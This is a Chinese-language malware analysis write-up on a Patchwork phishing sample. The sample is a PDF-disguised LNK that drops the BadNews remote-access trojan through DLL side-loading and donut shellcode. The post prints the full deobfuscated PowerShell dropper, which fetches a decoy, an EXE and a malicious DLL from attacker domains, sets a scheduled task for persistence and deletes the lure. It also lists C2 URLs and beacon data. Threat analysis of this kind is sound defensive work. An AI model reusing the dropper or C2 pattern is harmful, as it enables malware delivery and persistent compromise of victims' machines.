---
title: Patchwork组织针对巴基斯坦钓鱼样本分析
date: 2026-03-18 11:30:00 +0800
categories: [样本分析， Patchwork]
tags: [Patchwork]
---

## 0x01.样本介绍

Patchwork组织又名Hangover、Dropping Elephant，最早披露于2013年。最早攻击活动可以追溯到2009年，主要针对中国、巴基斯坦等亚洲地区和国家进行网络间谍活动。在针对中国地区的攻击中，其主要针对政府机构、科研教育领域进行攻击。具有Windows、Android、macOS 多系统攻击的能力。

此样本是一个带有PDF图标的LNK文件，点击后会下载真正的PDF并打开，真正的PDF如下：

![微信图片_20250716220410](/assets/img/patchwork-assets/微信图片_20250716220410.png)

## 0x02.样本分析

该样本是个PDF图标的LNK文件，双击后会使用conhost执行powershell，然后执行脚本。

![image-20250331104021315](/assets/img/patchwork-assets/image-20250331104021315-17450558090451.png)

此脚本经过简单混淆还利用到了powershell的别名机制，还原后就是如下：

```powershell
$ProgressPreference = 'SilentlyContinue'; # 禁用进度显示以隐蔽执行
$b = 'C:\Users'; 

Invoke-WebRequest https://atus.toproid.xyz/klhju_rdf_gd/ktdfersfr -OutFile $b\Public\Project_Guideline.pdf;
Start-Process $b\Public\Project_Guideline.pdf; 

Invoke-WebRequest https://zon.toproid.xyz/pfetc_ksr_lo/jyuecvdgt -OutFile "$b\Public\hip";
Rename-Item -Path "$b\Public\hip" -NewName "$b\Public\WerFaultSecure.exe";

Invoke-WebRequest https://zon.toproid.xyz/aewbf_jsd_td/ktrgdysvt -OutFile "$b\Public\hello";
Rename-Item -Path "$b\Public\hello" -NewName "$b\Public\wer.dll";

Copy-Item "$b\Public\Project_Guideline.pdf" -Destination .;

schtasks /create /Sc minute /TN WinUpdate /TR "$b\Public\WerFaultSecure" /F;

erase *d?.?n?
```

这个脚本干了下面几件事：

- 从远程服务器拉取真正的PDF文件，保存为`C:\Users\Public\Project_Guideline.pdf`，并打开PDF；

- 从远程服务器下载白文件，保存为`C:\Users\Public\WerFaultSecure.exe；`；
- 下载黑Dll，保存为`C:\Users\Public\wer.dll`；
- 将下载下来的PDF放入当前LNK目录；
- 创建一个名为`WinUpdate`的计划任务，每分钟执行`C:\Users\Public\WerFaultSecure.exe`；
- 删除原先的LNK文件；

### 黑DLL分析

会从自身解密出一段shellcode，然后开辟内存，CreateThread加载shellcode。

![image-20250331112545941](/assets/img/patchwork-assets/image-20250331112545941-17450558113223.png)

shellcode一开始就是一个call指令到很远的地方执行。刚开始的call指令和call的目标地址，中间的数据均为加密的一些数据，猜测为真正的载荷。

![image-20250331160508834](/assets/img/patchwork-assets/image-20250331160508834-17450558146695.png)

![image-20250331160021785](/assets/img/patchwork-assets/image-20250331160021785-17450558161677.png)

后面会对这块加密的数据进行复制。

![image-20250331160429382](/assets/img/patchwork-assets/image-20250331160429382-17450558176549.png)

然后就对shellcode中这块加密数据进行解密了，解密出的内容其中存在PE格式，还有一些会使用到的字符串信息等。

![](/assets/img/patchwork-assets/image-20250331161340677-174505581903211.png)

获取LoadLibraryA地址并加载了会使用到的一些系统Dll。通过Hash算法，获取这些系统Dll中一些api。

![image-20250401105020027](/assets/img/patchwork-assets/image-20250401105020027-174505582151613.png)

此shellcode使用到了开源加载器[donut](https://github.com/TheWover/donut)，加载器中间过程很复杂，反正最终载荷在内存中加载，最终载荷是Patchwork组织的特马`BadNews`，即解密出来的PE格式文件，下面直接到此PE入口点执行了。

![image-20250716215446877](/assets/img/patchwork-assets/image-20250716215446877.png)

![image-20250402095029245](/assets/img/patchwork-assets/image-20250402095029245-174505582379515.png)

### BadNews分析

![image-20250716215523697](/assets/img/patchwork-assets/image-20250716215523697.png)

首先创建了一个名为`gqfffhj`的互斥体。

![image-20250402104950188](/assets/img/patchwork-assets/image-20250402104950188-174505582518417.png)

然后拼接了wininet库和其中的一些api字符串，还有和C2通信的uri，并且通过一个UUID和当前卷路径编码或加密两次得到一个类似Base64字符串。

![image-20250402173418682](/assets/img/patchwork-assets/image-20250402173418682-174505582627719.png)

然后往下就是对Windows版本的判断，最多到`windows 10`。

![image-20250402113721192](/assets/img/patchwork-assets/image-20250402113721192-174505582782121.png)

然后GetVersion直接判断

![image-20250402113909920](/assets/img/patchwork-assets/image-20250402113909920-174505582911123.png)

返回`windows 10`

![image-20250402114354213](/assets/img/patchwork-assets/image-20250402114354213-174505583038925.png)

然后经过和上面一样的编码或者加密操作，最后也是返回了一串编码过的字符串。

![image-20250402114729094](/assets/img/patchwork-assets/image-20250402173627516-174505583188627.png)

后面和上面类似，依次获取UserName、内网ip。获取外网ip以及所属国家时，会向特定的api接口发送http请求来查询ip和所属地，然后由服务端返回。获取到信息都会经过两次编码。

![image-20250402180047438](/assets/img/patchwork-assets/image-20250402180047438-174505583316329.png)

然后将获取到的数据进行拼接，以`#**#`为分隔符。

最后得到的结果为

`uedf=TxcjOFes05KNp76mWsWqtBmtvx9fzDnga/PfnouhhcQ3ZEVEUaArlkCBBg8DysgUa8eYD82g1ju3c97bHLkvvw==#**#dSHXPP0JYsd3jE+uURPmWw==#**#dfJdn+oj+oiA4vT/sapfxA==#**#pQos+hH1+dgodd1eMFc4Ug==#**#SVtd9hRcPK+A/iHv53rqaE09Rae7YsrR64T2f2P932s=#**#SZoAICXIVx090BdOPbw9nQ==`

![image-20250402180807473](/assets/img/patchwork-assets/image-20250402180807473-174505583739231.png)

然后CreateThread创建了两个线程，第一个线程函数是为了保持心跳请求。会以POST请求 `https://weixin.info/1WrCVzW4kSDNbNTt/cqWf4vQlofzqFkc7.php`发送上面的上线数据包。

![image-20250403094444698](/assets/img/patchwork-assets/image-20250403094444698-174505584034835.png)

![image-20250403094656738](/assets/img/patchwork-assets/image-20250403094656738-174505583889133.png)

第二个线程函数是保持心跳的同时，获取任务号。

![image-20250403094742600](/assets/img/patchwork-assets/image-20250403094742600-174505584203337.png)

